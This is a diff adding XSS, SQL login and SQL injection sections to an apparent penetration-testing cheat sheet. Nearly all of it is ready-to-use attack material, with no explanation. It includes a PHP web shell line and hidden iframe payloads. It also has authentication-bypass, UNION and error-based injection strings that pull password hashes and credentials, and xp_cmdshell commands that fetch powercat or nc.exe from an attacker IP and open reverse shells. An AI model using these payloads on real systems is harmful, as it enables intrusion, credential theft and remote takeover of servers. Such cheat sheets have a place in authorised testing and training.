@@ -30,6 +30,78 @@ php -S 0.0.0.0:80
 <?php passthru($_GET['cmd']); ?>
 ```
 
+## XSS 
+```
+<iframe src=http://192.168.119.243/mHxH2w height="0" width="0">
+<iframe src=http://192.168.119.243/MmVIPvoTOI>
+```
+
+## SQL login/ Injection
+login/commands
+```
+# Linux:
+mysql -u root -p
+mysql -h 10.1.1.1 -u root
+SELECT @@version
+SELECT user()
+SHOW DATABASE
+SHOW TABLES
+SELECT host, user, password FROM mysql.user
+
+# Windows:
+Mssql (port 1433), common username = sa
+sqsh -S 10.11.1.31 -U sa -P poiuytrewq
+SELECT @@version
+SELECT user_name()
+SELECT name FROM master..syslogins
+SELECT name, password FROM master..sysxlogins
+
+cmd:
+sp_configure 'show advanced options', '1'
+RECONFIGURE
+sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+EXEC master..xp_cmdshell 'whoami'
+EXEC master..xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.119.243:80/powercat.ps1");powercat -c 192.168.119.243 -p 443 -e cmd | powershell -noprofile'
+```
+Injections
+```
+somepass' or '1' = '1
+tom' or 1=1 --
+tom' or 1=1 #
+
+# Union:
+'union all select table_name,null,null from all_tables--              
+'union all select column_name,table_name,null FROM all_tab_columns--
+'union all select user_name,password,null from web_users--
+
+'union select name,1 FROM master..syslogins--
+'union select name,1 FROM master..sysdatabases--
+'union select master..syscolumns.name,1 FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sql_logins'--
+
+';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+';EXEC xp_cmdshell "powershell.exe wget http://192.168.119.243:80/nc.exe -OutFile c:\\Users\Public\\nc.exe";--
+';EXEC xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.119.243 443";--
+
+# Error based:
+',CONVERT(INT,@@version))--
+
+',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
+
+',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+
+',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
+
+',CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
+
+',CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [archive]..[pmanager] )+CHAR(58)+CHAR(58))))--
+
+',CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 alogin FROM (SELECT top 1 alogin FROM archive..pmanager ORDER BY alogin ASC) sq ORDER BY alogin DESC)+CHAR(58)+CHAR(58))))--
+
+',CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))--
+```
+
 ## Curl request
 ```
 #GET:
